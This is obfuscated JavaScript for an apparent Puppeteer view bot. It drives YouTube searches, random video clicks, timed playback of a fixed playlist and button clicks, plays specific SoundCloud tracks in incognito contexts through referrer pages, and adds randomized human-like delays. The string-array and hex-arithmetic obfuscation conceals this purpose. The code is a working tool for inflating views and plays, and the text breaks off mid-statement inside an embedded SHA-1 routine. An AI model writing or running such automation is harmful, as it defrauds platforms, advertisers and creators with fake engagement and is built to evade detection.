function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * -0x8e1 + -0xdcf + 0x16b0);
    let h = e[f];
    if (c['CImNod'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x2092 + -0x1 * -0x95 + 0x1ffd * 0x1, r, s, t = 0x836 + -0x1fdc + -0x2 * -0xbd3; s = m['charAt'](t++); ~s && (r = q % (0xbb + -0x15b * 0x7 + 0x8c6) ? r * (-0x1d9f + 0x2117 * -0x1 + 0x3ef6) + s : s, q++ % (-0x7f9 + -0xb1d + -0x98d * -0x2)) ? o += String['fromCharCode'](0x1509 + -0x124f + 0x1bb * -0x1 & r >> (-(-0x218f + 0x8c * -0x1d + 0x316d) * q & -0xa * -0x2d0 + 0x76e * 0x1 + -0x2388)) : 0x1d98 + 0xa47 * 0x1 + -0xad * 0x3b) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1ebc + 0x8 * -0x277 + -0xb04, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x25cc + 0x35 * -0x90 + 0x34 * -0x27))['slice'](-(-0x76 * -0xc + -0x2 * 0xe39 + -0x3 * -0x7a4));
        }
        return decodeURIComponent(p);
      };
      c['AiAusa'] = i, b = arguments, c['CImNod'] = !![];
    }
    const j = e[0x1c42 + 0x125e * 0x2 + 0x15aa * -0x3],
      k = f + j,
      l = b[k];
    return !l ? (h = c['AiAusa'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * -0x8e1 + -0xdcf + 0x16b0);
    let h = e[f];
    return h;
  }, d(b, c);
}
const Z = b,
  Y = d,
  X = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x976 + 0xbb + -0x56 * -0x1a))) + i;
}

function a() {
  const bn = [
    'Agar.io,_S',
    'aHX5b23dG8kMWR7dILe',
    'zwfZEwzVCMSUBW',
    'BZf4nNfxANO3sW',
    's\x20marriage',
    'rew,mrbeas',
    'W5LnW5ZdJmoKnSomW64XBW',
    'W4GkamojWQb1WQVcNXhdKq',
    'tMf2AwDHDgLVBG',
    'd8kAW5/cVbBcJbddUYWx',
    'Dgv4Dc9ODg1Sla',
    'BhzLCI1IEs1UBW',
    'https://ww',
    'u2fMyxjPlZuZnW',
    '0123456789',
    'block',
    'qJKLqKyLrtuLoq',
    'ChvZAa',
    'map',
    'WP4IWOC8kmoVbSoxW6/cKa',
    'lXxcHCkTW401W71EW6BcLW',
    'BMv3ugfNzq',
    'yKN_QkroH6',
    'ywXZlw9MlwmTzq',
    'W5NcP8keW4zK',
    'ratums.io'
  ];
  a = function() {
    return bn;
  };
  return a();
}
async function createPage(f, h) {
  const R = c;
  let i = await f['newPage']();
  return await i['setDefault' + R(0x8) + 'Timeout'](-0x25dd + -0x1d9f + 0x10df * 0x4), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x9605 + -0x2fd6 + 0x13b0b + (-0x3b * -0x1af + -0x66ad + 0x3df0) * random()) : await standardWaitForNetIdle(f), await wait(0x6ac + 0x2598 + -0x18bc + (0x20f + 0x8 * 0x5b6 + -0x3 * 0x2e5) * random()), 0x38 + 0x43 * 0x8e + -0x2561;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x2f5 * -0x4 + -0x443 * -0x9 + -0x1ea7), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0xc24 + -0x30b * -0x6 + -0x1e65;
}
async function randomWait() {
  return await wait(0x517 * 0x7 + -0x203 * -0x9 + -0x18e * 0x16 + (-0x2 * -0x2af + 0x31e * -0x2 + 0x1466) * random()), 0x15ce * 0x1 + 0x1f61 * 0x1 + 0x11ba * -0x3;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x74e + 0x69a + 0x5 * -0x2c8, 0x216c + -0x1ab4 + -0x3 * 0x23b), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x51 * -0x87 + 0x3 * 0x5a03 + 0x390 * -0x16) * getRandomInt(-0x2124 + -0x1 * 0x23e8 + 0x450e, 0x8 * -0x342 + -0x1a80 + -0x15 * -0x281), h)), 0xb74 + -0x56 * 0x2 + 0x59 * -0x1f;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x270d + 0x996 * -0x1 + 0x1d77 * -0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1dff + 0x537 + 0x18c9]['split']('\x20');
    for (let k = -0x56 * 0x29 + -0x3 * 0x3f5 + 0x19a5; k < i['length']; k += 0xa7b + -0x210b + 0x1692)
      j += i[k] * h[i[k + (0x1 * 0x1f9 + -0x8 * -0x488 + -0x2638)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2663 + 0x45 * -0xa + 0x291b)['map'](l => Array['from'](l['children']))['flat'](0xa * -0x28b + -0x185 * 0x17 + 0x3c62)['map'](l => l['childNodes'][0x397 * 0x7 + 0x1915 + -0x3235]['childNodes'][-0x1 * 0x1ac1 + 0x2151 + -0x690]['childNodes'][0x2 * 0x845 + -0x81a + -0x86f * 0x1]['childNodes'][0x26f4 + -0x8a7 * 0x3 + -0x455 * 0x3]['childNodes'][0x6 * 0x1f8 + -0x3 * 0x493 + -0x1ea * -0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1211 + -0x6 * 0x28c + -0x11f * -0x1, -0x2 * -0xf0d + -0x1 * 0x1543 + 0xab1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x2689 * -0x1 + 0x5a8f * -0x1 + 0xe70 * 0xd);
  const h = await getMaxTime(f),
    i = Math['min']((0x74 * -0x2ad + 0x1534 + 0x82e4 * 0x4) * getRandomInt(-0x17f9 + 0x21d + 0x9 * 0x26e, 0x4d * -0xd + -0x44d * 0x7 + 0x2209), h);
  return await wait(i), 0xba8 + 0x539 * -0x5 + -0x1 * -0xe76;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1ab7 + 0x4 * 0x920 + -0x1 * 0x9c9]['children'][-0xf84 + -0x32a + 0x12ae]['children'][0x8d0 * -0x1 + -0xd5c * -0x2 + -0x11e8]['children'][0xf57 + 0x2239 + -0x3190]['children'][-0x3 * -0xc51 + -0xcef + -0x1804]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1c5e + 0x1 * 0x1287 + 0x9d8;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1818 + -0x1993 + 0x1df + (0x221a + -0x347 * 0x8 + -0x7b0) * random()
  }), await wait(0x16 * 0xf7 + -0x3b * -0xd + -0x1645 + (-0x2130 + -0xb76 * -0x2 + 0xb70) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const S = d,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))[S(0x12)](p => p['childNodes'][-0x1 * -0x248c + 0x2316 + -0x47a0]['childNodes'][-0x9b7 + -0x9 * 0x40 + 0xbf8]['childNodes'][0x7 * 0x3c3 + -0xac1 * -0x1 + 0x2515 * -0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x11 * -0xf7 + 0xff4 + 0x5 * 0x18]['childNodes'][-0x1 * -0x6dd + 0x1 * -0x11b3 + 0x2 * 0x56b]['childNodes'][-0x1 * 0x23c5 + 0x1d77 + 0x650]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x6 * 0x435 + 0x12a * 0x1a + -0x505),
          r = -0x2403 + 0x1 * -0xfd9 + 0x33dc;
        for (let u = -0x1 * 0x150b + -0x6c8 + 0x1bd3; u < q['length']; u += -0x26af + 0x18c5 + 0xdec)
          r += q[u] * k[q[u + (0x44b + 0xb7 * -0x18 + 0xcde)]];
        return r;
      }(n);
  });
  await wait((0x6147 + -0x5f64 + 0x38b5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x94c6 + 0xcd2 + 0x17254) * getRandomInt(0x8c6 + -0x26 * 0x1d + 0x17d * -0x3, 0x1de * 0xb + -0x7 * -0xae + -0x2 * 0xca1), h + (0x1 * -0xbef + 0x1 * 0x2217 + -0x2a0));
  return await wait(i), -0x2f7 + -0x1480 + 0x1778;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * 0x2375 + -0x19c9 + 0x26b * -0x4), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x360 * 0x3 + -0x1541 + 0x16d9 + (0x2250 + 0x1 * -0xfbb + -0xdd * 0x11) * Math['random']());
    });
  }, 0x752 + -0x2bd1 + 0x3fd7);
  await wait(-0x1 * -0x8d350 + -0x62c8a + -0x36ca * -0x9);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x26 * 0xbab + -0xcec5 + -0x23d) * getRandomInt(-0x1c39 + -0x935 * 0x2 + -0xf8d * -0x3, -0x1227 + -0x79f + 0x19df)), clearInterval(h), 0xbf * 0x32 + 0x1267 + -0x26c * 0x17;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1c72 + -0xe18 + -0x14e * 0xb;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x6b1 + 0x216a + -0x1ab8;
    await randomWait();
  }
  return -0x8d2 * -0x1 + 0x86b * 0x3 + -0x2212;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1bca + 0x928 + -0x1279 * 0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1b0a + 0x1 * -0x1e1a + -0x2 * -0x1c92 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = b,
      T = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x11 + -0x1e2a + 0x1e19 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j[T(0x15)]();
      let l = 0x335 * 0x3 + 0x9b3 + -0x1352;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x2fd3 + 0x148f1 + -0x4 * 0x323f + getRandomInt(-0xa77 + 0x45df + -0xd0, 0x2859 * 0x5 + -0x7493 + 0x2006));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x246d + 0x1db * 0x5 + 0x1b27), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x474 + 0x206 + 0x26e;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x3a9 * -0x5 + -0x1219 + -0x1 * 0x34, -0xb93 + 0x50f + 0x6b6)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s[U(0x18, 'kRs)')](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x3a7 + -0xbc0 + 0xfe9 + floor((-0x25b9 + 0x187 + 0x281a) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = (V(0xe) + 'abcdef')['split'](''), x = [
          -(0x29d98c0 + 0x568cc70b * -0x2 + 0x953dfaab * 0x2),
          0x1 * 0x73c849 + 0x2c0ea2 + -0x1fd6eb,
          0xbf05 + 0x1b3b + -0x5a40,
          -0x1324 + -0x56 * 0x28 + 0x2114
        ], y = [
          -0x25 * 0x9d + 0x1 * 0x1563 + 0x166,
          -0x1 * -0x584 + 0xfc0 + -0x1534,
          -0x1 * -0x158f + 0x3 * 0x8d + 0xb97 * -0x2,
          -0xed6 + -0x905 + -0x1f * -0xc5
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x4b1 + -0x3a * 0x7 + 0x18d * -0x2)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x2 * -0xce5 + -0x1cd3 + 0x369d; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1b63 + -0x1e03 * 0x1 + 0x3966) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x15f9 + 0x2 * -0x1cf + 0x25 * -0x7f] = A[-0x2056 + -0x3 * -0x303 + 0x175d * 0x1] = A[-0x239 + 0x1a29 + -0x1 * 0x17ef] = A[0x57e + -0x163b + 0x10bf] = A[0x6bc * -0x5 + -0x5 * -0x259 + 0x6a * 0x35] = A[-0x35 * 0x3 + -0x7 * -0x2b1 + -0x1234] = A[-0x1240 + 0x149f * -0x1 + 0x26e4] = A[-0x2238 + 0x3 * 0x2cf + 0x19d1] = A[-0xb1d + 0x21ed + -0x16c9] = A[-0x1321 + -0xfa9 * -0x1 + 0x380] = A[0x2 * -0xde + 0x2228 + -0x2063 * 0x1] = A[-0x2 * 0x67d + 0x1986 + 0x2 * -0x641] = A[0x16fc + 0x8c * 0x19 + -0x53b * 0x7] = A[-0x1388 + 0x1 * -0x2275 + 0x3609] = A[0xdd1 + -0x1959 + -0x1 * -0xb95] = A[-0x81a + 0x5 * 0x4de + -0x6d * 0x26] = A[0x100a + -0xfa4 + -0x1 * 0x57] = -0x2494 + 0x251 + 0x2243, this['blocks'] = A) : this['blocks'] = [
                0x180a + -0x9cc + -0xe3e,
                -0x1 * -0x815 + 0x5bd + -0xdd2,
                -0x2b9 + 0x51f * -0x2 + -0xcf7 * -0x1,
                -0xf81 + 0xe4f + 0x99 * 0x2,
                -0x938 + -0x29f * 0xb + 0x260d,
                0x41b * -0x3 + -0x24a2 + 0x30f3,
                -0x3 * -0xa57 + -0x1 * 0xaab + -0x145a * 0x1,
                0x17f4 + 0x1 * -0xf6 + -0xb7f * 0x2,
                -0xfc2 + -0x1ac9 + -0x2a8b * -0x1,
                0x1882 + -0x12 * 0x101 + -0x2 * 0x338,
                -0x144b + 0x268f + -0x1244,
                0x60d * -0x2 + 0x3 * 0x95b + 0x3d * -0x43,
                -0xd33 + -0x99b * -0x1 + 0x2 * 0x1cc,
                -0x11 * -0x9e + -0x26d6 + -0x8 * -0x38b,
                -0x127d + 0x1147 + 0x136,
                0x1bc2 + -0x12a1 + -0x1 * 0x921,
                -0x1766 + 0x59f + 0x11c7
              ], this['h0'] = 0x728b8078 + -0x80370714 + 0x74f0a99d * 0x1, this['h1'] = 0xe8 * 0xfcafde + -0xd45f1 * -0xd53 + -0xa60c9fca, this['h2'] = 0x7db4b * 0x1805 + 0x3788bfc9 * -0x4 + 0xba278bab, this['h3'] = 0xce712e7 + -0x58be223 + 0x7 * 0x1434e3e, this['h4'] = -0x26a8c4e * -0x56 + -0x4f737c4d * 0x1 + 0x1 * 0x437b3c09, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x4 * -0x851 + -0xdbf + -0x107 * 0x13, this['finalized'] = this['hashed'] = -0x1 * 0x243e + -0x3 * 0x99b + -0x5 * -0xd03, this['first'] = -0xe09 * -0x1 + 0xaa0 + 0x41c * -0x6;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xd * -0x47 + -0x2492 * 0x1 + 0x20f7, O = J['length'] || -0x55d * -0x5 + -0xcbf + -0xe12, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x559 * 0x1 + 0x2f9 * 0x3 + -0x1c9 * 0x2, P[-0x18eb + -0x2b * 0x5 + -0x19c2 * -0x1] = this['block'], P[0x1 * -0xed5 + -0x164 * 0x10 + 0x101 * 0x25] = P[0x1ff6 + -0x1 * -0x1eaf + -0x3ea4] = P[0xb99 + -0x591 + -0x606 * 0x1] = P[-0x3 * -0xb1b + 0x1bea + -0x3d38] = P[0x59 * 0xa + 0xd5 * -0xa + 0x4dc] = P[0x73 * 0x3c + -0x2308 + 0x819] = P[0x2 * 0xe41 + -0x1069 + -0xc13] = P[-0x14 * -0x1a6 + 0x138 * -0x17 + -0x4e9] = P[0x18a5 + 0x1669 * -0x1 + -0x234] = P[-0x176 * -0x5 + -0x1988 + -0x1 * -0x1243] = P[0x14 * 0x68 + -0x1 * -0x2521 + -0x2d37] = P[0x2 * 0x97a + -0x19c3 + 0x6da] = P[0x239 * 0xb + 0xdb3 + -0x261a] = P[-0x13f6 + 0x181 * 0x7 + -0x4 * -0x25f] = P[0xb6d + 0x475 + -0x7ea * 0x2] = P[-0x1 * 0x967 + -0x35d * -0x3 + -0xa1] = 0x82f * -0x1 + -0x20de + 0x5d * 0x71), K) {
                    for (N = this['start']; M < O && N < -0x1 * -0x125b + 0x217 * -0xd + 0x910; ++M)
                      P[N >> -0xf9b + -0x24a1 + 0x343e] |= J[M] << y[-0x6 * 0x533 + 0x1ccf + 0x1 * 0x266 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xc5 * 0x25 + 0x21fa + -0x541; ++M)
                      (L = J['charCodeAt'](M)) < -0xb5 * 0x17 + -0x1e46 + 0x2f09 * 0x1 ? P[N >> 0xeba + 0x972 + -0x182a] |= L << y[0x2228 + 0xed1 + -0x30f6 & N++] : L < -0x48b * 0x5 + 0x6ee + 0x17c9 ? (P[N >> 0x3c * 0x78 + 0x187c + 0x1 * -0x349a] |= (0x2 * 0xa04 + -0x94 * -0x39 + -0x2 * 0x1a1e | L >> -0x18f8 + -0xcc1 * -0x2 + -0x84) << y[0x695 * 0x3 + -0x895 + -0xb27 & N++], P[N >> -0x11ca + -0x24f6 + 0x36c2 * 0x1] |= (-0xf * -0x15a + -0x2203 * 0x1 + 0xe3d | -0x4df + -0x11 * 0x1d3 + 0x3 * 0xc0b & L) << y[0x1 * -0x58b + 0x665 * -0x5 + 0x2587 & N++]) : L < 0xfff8 * -0x1 + -0x1ed * 0x3b + -0x24997 * -0x1 || L >= 0x1 * -0x42fd + -0x30a6 + 0x153a3 ? (P[N >> -0x1 * 0x1189 + 0xd * 0x29b + -0x1054] |= (-0x1083 + 0xf07 * -0x2 + 0x2f71 | L >> 0x79 + -0x1 * -0x1641 + -0x16ae) << y[-0x17b7 + 0x269 * 0xd + -0x79b & N++], P[N >> -0x2276 + 0xd * 0x16 + 0x215a] |= (0x1 * 0x87b + -0x2 * -0x136c + -0x2ed3 | L >> 0x1746 + -0x2 * -0x16e + -0x1a1c & 0x15 * -0xb9 + -0x8ea + -0xe * -0x1bd) << y[-0xe3d + -0x9ca + 0x180a & N++], P[N >> -0x2 * 0x335 + -0x960 + 0x6 * 0x2a2] |= (0x800 * 0x1 + -0xb04 + -0x3c * -0xf | -0x2293 + 0x1 * 0x1038 + 0x129a & L) << y[0x23ea + -0x23e + -0x21a9 & N++]) : (L = 0x7617 + 0x30 * -0x9a8 + 0x25969 + ((0x892 + -0x42 + 0x11 * -0x41 & L) << 0xd * 0x2e5 + -0x1140 + -0x1457 * 0x1 | 0x4c * -0x8 + -0xc * -0x31a + -0x1ed9 & J['charCodeAt'](++M)), P[N >> 0x127d + -0x1984 * -0x1 + -0x1 * 0x2bff] |= (0x49 * -0x4a + 0x387 * -0x4 + 0x2426 | L >> 0x2 * -0xe06 + 0x1e1d + -0x1ff) << y[0x218b + 0x2264 + 0x114 * -0x3f & N++], P[N >> -0x1 * 0x1b95 + -0x1538 + 0x30cf] |= (-0x123f + 0x1a * -0x5 + -0x1341 * -0x1 | L >> 0x5 * -0x37c + -0x1a59 + -0x2bd1 * -0x1 & 0x1cc + -0x113d + 0xfb0) << y[-0x10e1 + -0x1855 + -0x3d * -0xad & N++], P[N >> 0x1 * -0x1cb7 + 0x2629 * 0x1 + -0x970] |= (-0xcf5 * -0x3 + -0x1853 + -0xe0c | L >> -0x17a0 + 0xcb0 + 0xaf6 * 0x1 & 0x2351 * 0x1 + 0x2597 + 0xb * -0x69b) << y[-0x1b3a + 0xdf6 + -0x21 * -0x67 & N++], P[N >> 0xd2f + 0x1 * -0x1fb + 0x2 * -0x599] |= (0x25 * 0xcb + -0x24bd + 0x7e6 | 0x1196 + -0x2135 + 0xfde & L) << y[-0x96f + 0x45e * 0x3 + -0xea * 0x4 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x231a + 0x1b * -0x116 + -0x1 * 0x588 ? (this['block'] = P[-0x1 * -0x1d54 + 0x2 * -0x8fb + -0x1 * 0xb4e], this['start'] = N - (0x2 * 0x839 + 0x1 * 0x127c + -0x22ae), this['hash'](), this['hashed'] = -0x1b31 + -0xb * 0x297 + 0x37af * 0x1) : this['start'] = N;
                }
                return this['bytes'] > 0xb55d60c3 * -0x1 + -0xf38fee1 * 0x1f + -0xd25 * -0x452cad && (this['hBytes'] += this['bytes'] / (-0x108785b70 + -0x1425187dc + 0x3905 * 0xec7dc) << 0x2621 * 0x1 + 0x256e + -0x4b8f, this['bytes'] = this['bytes'] % (-0x1cc67 * -0xb53c + 0x43c730 * -0x30d + 0x88d5f24c)), this;
              }
            }
            ['finalize']() {
              const W = d;
              if (!this['finalized']) {
                this['finalized'] = 0xb1f + -0x1b1 * 0x12 + 0x1354;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1b09 + 0x134f + 0x8 * -0x5c9] = this['block'], J[K >> 0x509 * -0x5 + -0x1 * 0x20d7 + 0x425 * 0xe] |= x[0x23ad + 0x4b * 0x5 + 0x1 * -0x2521 & K], this[W(0xf)] = J[-0x2363 + 0x7d1 * 0x3 + 0xc00], K >= -0x2664 + 0x1ab * 0x1 + 0x24f1 && (this['hashed'] || this['hash'](), J[-0x18c2 * 0x1 + -0x1847 + 0x3109] = this['block'], J[-0x251f * 0x1 + 0x3c3 + 0x216c] = J[0x16f6 * -0x1 + 0x1c73 + -0x75 * 0xc] = J[0x1 * -0x24a7 + -0x81 * -0x31 + 0x2fe * 0x4] = J[0x1d52 + -0x4 * 0x12d + -0x189b] = J[0x12af + 0x6f5 * 0x1 + 0x148 * -0x14] = J[0x21fb + -0xdf * 0xc + -0x66 * 0x3b] = J[-0x10b * 0x6 + -0x10fa + 0x2 * 0xba1] = J[-0x234f + 0x1 * 0x214e + 0x14 * 0x1a] = J[0x22 * 0x4f + -0xb * 0x2b3 + -0x223 * -0x9] = J[0x204a + 0x1 * 0x1b38 + -0x3b79] = J[0x10 * -0x1cb + -0xb7 * 0x2 + -0xc1 * -0x28] = J[0x59 * 0x59 + 0x1710 + 0x1 * -0x35f6] = 